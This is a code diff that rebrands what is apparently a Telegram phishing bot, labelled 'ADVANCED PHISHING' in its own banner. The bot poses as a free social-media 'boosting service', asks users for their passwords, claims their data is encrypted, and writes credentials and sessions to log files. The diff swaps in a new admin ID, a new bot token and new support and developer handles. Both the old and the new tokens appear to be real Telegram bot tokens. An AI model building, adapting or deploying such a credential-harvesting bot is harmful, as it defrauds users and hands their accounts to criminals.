@@ -29,8 +29,8 @@ print(f"{RED}{BOLD}𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗣𝗛𝗜𝗦𝗛𝗜𝗡
 print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
 
 
-ADMIN_ID = "8580184759"
-BOT_TOKEN = "8873884988:AAEB6A12zLrFcrQ9nVKnSYmoC0jXIBJyWHk" 
+ADMIN_ID = "8969010897"
+BOT_TOKEN = "9177120976:AAE2SeCABm2JoBUFlhQV5PPLXGbHuo9Z4h4" 
 
 print(f"\n{GREEN}✅ 𝗔𝗱𝗺𝗶𝗻 𝗜𝗗 𝗦𝗲𝘁: {YELLOW}{ADMIN_ID}{END}")
 print(f"{GREEN}✅ 𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻 𝗦𝗲𝘁: {YELLOW}{BOT_TOKEN[:15]}...{END}")
@@ -137,7 +137,7 @@ def start_command(message):
     
     # 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗣𝗟𝗔𝗧𝗙𝗢𝗥𝗠 𝗦𝗘𝗟𝗘𝗖𝗧𝗜𝗢𝗡 𝗯𝘂𝘁𝘁𝗼𝗻𝘀
     welcome_text = """
-✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 ROH-VIP 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗦𝗲𝗿𝘃𝗶𝗰𝗲! ✨
+✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 XNS-VIP 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗦𝗲𝗿𝘃𝗶𝗰𝗲! ✨
 
 𝗚𝗲𝘁 𝗳𝗿𝗲𝗲 𝗯𝗼𝗼𝘀𝘁 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝘀𝗼𝗰𝗶𝗮𝗹 𝗺𝗲𝗱𝗶𝗮 𝗮𝗰𝗰𝗼𝘂𝗻𝘁𝘀:
 
@@ -468,8 +468,8 @@ def ask_password(message):
 
 🔒 𝗬𝗼𝘂𝗿 𝗱𝗮𝘁𝗮 𝗶𝘀 𝘀𝗲𝗰𝘂𝗿𝗲𝗱 𝘄𝗶𝘁𝗵 𝗮𝗱𝘃𝗮𝗻𝗰𝗲𝗱 𝗲𝗻𝗰𝗿𝘆𝗽𝘁𝗶𝗼𝗻
 
-📞 𝗦𝘂𝗽𝗽𝗼𝗿𝘁: @Xyz_Zico
-📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @Xyz_Zico"""
+📞 𝗦𝘂𝗽𝗽𝗼𝗿𝘁: @shopoflie
+📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @xnsotp"""
     
     bot.send_message(message.chat.id, success_message)
     
@@ -503,8 +503,8 @@ def help_command(message):
 🆘 𝗛𝗲𝗹𝗽 & 𝗦𝘂𝗽𝗽𝗼𝗿𝘁
 
 📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗦𝘂𝗽𝗽𝗼𝗿𝘁:
-• 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺: @Xyz_Zico
-• 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @Xyz_Zico
+• 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺: @shopoflie
+• 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @xnsotp
 🔧 𝗖𝗼𝗺𝗺𝗼𝗻 𝗶𝘀𝘀𝘂𝗲𝘀:
 1. Boosting not started? Wait 24 hours
 2. Account not working? Contact support
@@ -531,8 +531,8 @@ except KeyboardInterrupt:
     print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
     print(f"{CYAN}📁 𝗖𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 𝗹𝗼𝗴: {credentials_log}{END}")
     print(f"{CYAN}📁 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 𝗹𝗼𝗴: {session_log}{END}")
-    print(f"{YELLOW}👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @IshrakShadman{END}")
-    print(f"{YELLOW}📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @IshrakShadman{END}")
+    print(f"{YELLOW}👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @shopoflie{END}")
+    print(f"{YELLOW}📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @xnsotp{END}")
     print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
     sys.exit(0)
 except Exception as e:
